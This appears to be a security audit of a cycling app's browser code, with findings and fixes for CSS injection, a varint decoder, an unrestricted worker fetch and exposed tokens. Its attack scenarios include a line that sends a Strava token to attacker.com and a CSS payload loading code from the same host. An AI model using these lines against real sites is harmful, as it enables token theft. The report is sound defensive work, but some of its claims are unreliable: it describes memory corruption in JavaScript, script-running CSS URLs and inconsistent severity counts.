scope: Frontend JavaScript (web/bike/*), upload clients, Bluetooth parsers, custom parsers, web worker, dependencies
summary: Comprehensive security audit identifying 7 confirmed vulnerabilities ranging from HIGH to MEDIUM severity. No SQL injection, XSS via escaping, or path traversal found. Critical issues: CSS injection, protobuf buffer overflow, SSRF in web worker, unvalidated data parsing.

vulnerabilities.cwe: CWE-94: Improper Control of Generation of Code
vulnerabilities.description: Color parameter injected directly into CSS style attribute without escaping. The zoneChip() function interpolates user-supplied color into inline styles: `style='--accent:${color}; --accent-d:color-mix(...${color}...)'`. If color contains CSS syntax (e.g., `red; background: url('javascript:alert(1)')` or `red; -moz-binding: url(http://attacker.com/xss.xml#xss)`), it could bypass XSS filters and execute arbitrary code.
vulnerabilities.attack_scenario: Malformed ZWO workout file or API response with color='red; background: url(data:text/html,...stealer...)'  embedded in step zone field. CSS parser interprets injected background URL, triggering JavaScript execution.
vulnerabilities.impact: CSS Injection could lead to JavaScript execution, credential theft, or DOM manipulation.
remediation: Validate color against whitelist: /^#[0-9A-Fa-f]{6}$|^rgb\(|^hsl\(/ only.
OR: Use CSS Custom Properties with pre-computed safe values, never interpolate user color directly.
OR: Use data- attributes and derive styles via JavaScript with proper sanitization.

vulnerabilities.description: The varint() decoder in decodeControllerNotification() increments `i` without bounds checking. Loop condition `while (b & 0x80)` reads unlimited bytes without verifying `i < bytes.length`. Malformed Zwift Ride protobuf data (unterminated varint) causes out-of-bounds read, reading past allocated buffer into undefined memory.
evidence: do { b = bytes[i++]; v += (b & 0x7f) * 2 ** s; s += 7; } while (b & 0x80);
vulnerabilities.attack_scenario: Malicious Zwift Ride device sends protobuf message with varint that never terminates (all bytes have high bit set). Decoder reads past buffer end, potentially accessing adjacent heap memory or triggering undefined behavior.
vulnerabilities.impact: Denial of Service (crash), memory corruption, information disclosure (if adjacent memory is readable).
remediation: Add bounds check: `while (b & 0x80 && i < bytes.length) { ... }`
Reject unterminated varints: if loop exits with `i >= bytes.length` and `b & 0x80`, throw error.
Cap varint decoding to max 5 bytes (covers all 32-bit values).

vulnerabilities.type: Untrusted URL Fetch in Web Worker
vulnerabilities.description: Web Worker accepts arbitrary URLs from parent thread via `event.data.url` without validating origin, protocol, or domain. Worker fetches any URL the parent thread requests: `const response = await fetch(event.data.url, event.data.fetchParams);`. Parent thread could invoke worker to fetch internal IPs (127.0.0.1, 169.254.169.254), private networks, or attacker-controlled domains.
vulnerabilities.attack_scenario: Compromised or malicious parent code (via DOM-based XSS in bike tab) sends worker message: `worker.postMessage({ url: 'http://127.0.0.1:8223/internal-api', fetchParams: {...} })`. Worker fetches internal endpoint, returns response to XSS payload.
vulnerabilities.impact: Bypass of CORS restrictions, access to internal APIs (runner's internal port 8223 is loopback-only but reachable from same machine), credential exfiltration.
remediation: Validate URL origin: reject non-HTTPS or non-matching origins.
Whitelist allowed domains: const ALLOWED_HOSTS = ['intervals.icu', 'strava.com'];
Document that worker is not safe for untrusted input; validate all URLs in parent before posting to worker.

vulnerabilities.description: Intervals.icu API key and Strava access token stored in sessionStorage and passed to fetch() as Authorization headers. While sessionStorage is ephemeral (cleared on session end), it is accessible to any JavaScript executing in the page origin. XSS within the bike tab module could steal tokens and use them to upload malicious activities.
vulnerabilities.attack_scenario: XSS in workouts.js XML parser (malformed ZWO file) or view.js color injection => injects `fetch('https://attacker.com?token=' + sessionStorage.getItem('pf-bike-strava-token')).` Token exfiltrated, used to upload fake activities.
vulnerabilities.impact: If XSS exists, attacker gains Strava/Intervals.icu upload access, can fraudulently log activities, modify athlete's profile, or delete history.
remediation: Store tokens on server-side via httpOnly, Secure cookies with Same-Site=Strict.
Proxy API requests through backend: `/api/upload/strava` endpoint authenticates client via session, fetches token server-side, uploads without exposing token to browser.
If browser storage required: use IndexedDB with restrictive CSP, never expose in Authorization header (proxy through service worker).

vulnerabilities.cwe: CWE-209: Information Exposure Through Error Message
vulnerabilities.type: Sensitive Data Exposure in Error Responses
vulnerabilities.description: API error responses (from intervals.icu and Strava) included verbatim in thrown errors. Third-party API responses may contain sensitive headers (X-Rate-Limit, authentication details), internal server errors, or stack traces. Errors exposed to console, error logs, and error reporting services.
evidence: throw new Error(`intervals.icu upload failed (${res.status}): ${await res.text()}`);
throw new Error(`Strava upload failed (${res.status}): ${await res.text()}`);
vulnerabilities.attack_scenario: Intervals.icu or Strava returns 401 + error body containing auth realm or internal error. Error thrown and logged to Sentry/console. Attacker monitors logs to glean API structure or auth details.
vulnerabilities.impact: Information leakage: API internals, auth mechanisms, rate-limit details exposed in logs.
remediation: Log full response server-side; expose only status code and generic message to user.
Example: `throw new Error(`Upload failed (${res.status})`); // log res.text() server-side only`
Sanitize error responses before returning to UI or logging.

vulnerabilities.cwe: CWE-827: Improper Control of Document Type Definition
vulnerabilities.type: Custom XML Parser Without Recursion Limits
vulnerabilities.description: Hand-rolled recursive-descent XML parser does not limit recursion depth or entity expansion. Deeply nested ZWO elements (or billion-laughs XML bombs) could cause stack overflow or excessive memory use, resulting in DoS.
evidence: children.push(parseElement());  // recursive call, no depth limit
vulnerabilities.attack_scenario: Malicious or malformed ZWO file with 1000+ nested <Block> elements: `<Workout><Block><Block><Block>... (nested 1000 times)`. Parser recursion depth hits JavaScript stack limit, crashes worker or browser tab.
vulnerabilities.impact: Denial of Service: tab/worker crash, workouts fail to parse, user cannot load/edit workout plans.
remediation: Add recursion depth tracking: `function parseElement(depth = 0) { if (depth > 100) fail('XML nesting too deep'); ... parseElement(depth + 1) }`
Cap total element count: `if (++elementCount > 10000) fail('XML too large');`
Replace with trusted library (e.g., xmldom or browser DOMParser in contexts where available).
Fuzz test with deeply nested and entity-expanded inputs.

vulnerabilities.description: parseHeartRate() does not validate BPM ranges. Malformed Bluetooth data (invalid flags byte or out-of-range values) accepted without bounds checking. Valid HR range is ~30–240 bpm; values outside this range could cause silent calculation errors or display glitches.
evidence: const bpm = view.getUint8(0) & 0x01 ? view.getUint16(1, true) : view.getUint8(1);
vulnerabilities.attack_scenario: Malicious or malfunctioning Bluetooth HRM sends HR value of 0xFFFF (65535 bpm) or negative uint16. Player metrics and zone calculations use raw value; NP/IF/TSS calculations produce nonsensical results, athlete training zones mislabeled.
vulnerabilities.impact: Silent data corruption: athlete receives wrong training feedback, fitness calculations corrupted, zone assignments wrong.
remediation: Validate BPM: `if (bpm < 30 || bpm > 240) { emit('warning', `Invalid HR ${bpm} bpm`); return null; }`
Log out-of-range values; emit event to UI to show device error.
Apply similar validation to power, cadence, speed in trainer.js and metrics.js.

positiveFindings: No SQL Injection: file-based JSON storage only, no SQL or database queries.
No hardcoded secrets in provided code (credentials loaded from environment).
XSS mitigation via escHtml() on dynamic HTML (label field correctly escaped in view.js).
Session-based auth with HttpOnly cookies (Python backend).
Path traversal defense: Python backend uses resolve() + is_relative_to() + is_file() checks.
FIT encoder: no user input injection, uses binary protocol safely.
Bluetooth parsers: FTMS, HR, Zwift Ride use typed DataView accessors (safer than manual byte indexing).
notApplicable: SQL Injection: JSON file storage; no SQL.
CSRF: stateless API calls; POST to external hosts (mitigated by CORS).
Deserialization: JSON.parse() used only on app-controlled files; no untrusted pickle/marshal.
XXE: XML parser has no DOCTYPE support (stripped before parsing).

recommendations.title: Fix CSS Injection in view.js:105
recommendations.action: Whitelist color values: /^#[0-9A-Fa-f]{6}$/ or use pre-computed safe CSS classes.
recommendations.verification: Unit test with malicious color values; CSP blocks inline style injection.

recommendations.title: Add Buffer Bounds Check to Varint Decoder (zwift-ride.js:48)
recommendations.action: Add `&& i < bytes.length` to while loop; cap varint to 5 bytes; reject unterminated.
recommendations.verification: Fuzz test with truncated/malformed protobuf messages; verify decoder rejects or throws error.

recommendations.title: Secure Web Worker (emscripten_fetch_worker.js:64)
recommendations.action: Whitelist allowed domains; reject localhost/private IPs; validate origin.
recommendations.verification: Unit test rejects 127.0.0.1, 192.168.x.x, internal API endpoints.

recommendations.title: Move Credentials to httpOnly Cookies
recommendations.action: Implement /api/upload/:service endpoint on backend; client calls it with session cookie; backend proxies request.
recommendations.verification: Verify tokens not in sessionStorage; Strava/Intervals.icu upload still works; tokens not exposed in Network tab.

recommendations.title: Sanitize API Error Responses (upload.js:25)
recommendations.action: Log full response server-side; throw generic Error to UI: `throw new Error('Upload failed');`
recommendations.verification: Verify no sensitive headers/bodies in browser console.

recommendations.title: Add Recursion Limit to XML Parser (workouts.js:100)
recommendations.action: Track parseElement() call depth; fail if depth > 100; cap total element count to 10k.
recommendations.verification: Fuzz test with deeply nested ZWO; verify parser rejects or throws error before crash.

recommendations.title: Validate Heart Rate Data Ranges (hr.js:10)
recommendations.action: Reject BPM < 30 or > 240; log warning; emit event to UI.
recommendations.verification: Mock Bluetooth device sending 0xFFFF BPM; verify rejected and user warned.

recommendations.title: Implement Content Security Policy (CSP)
recommendations.action: Add CSP header: `script-src 'self'; style-src 'self' https://fonts.googleapis.com; img-src 'self' data: https:; connect-src 'self' https://intervals.icu https://www.strava.com;`
recommendations.verification: Verify inline scripts blocked; external resources allowed; no CSP violations in console.

conclusion: Five HIGH-severity vulnerabilities require immediate remediation: CSS injection, buffer overflow, SSRF, credential storage, and error information disclosure. These could be chained (XSS via CSS → steal tokens via SSRF worker → upload malicious activities). Implement recommendations in priority order. Add fuzz testing for XML parser and protobuf decoder. Deploy CSP to mitigate XSS blast radius.
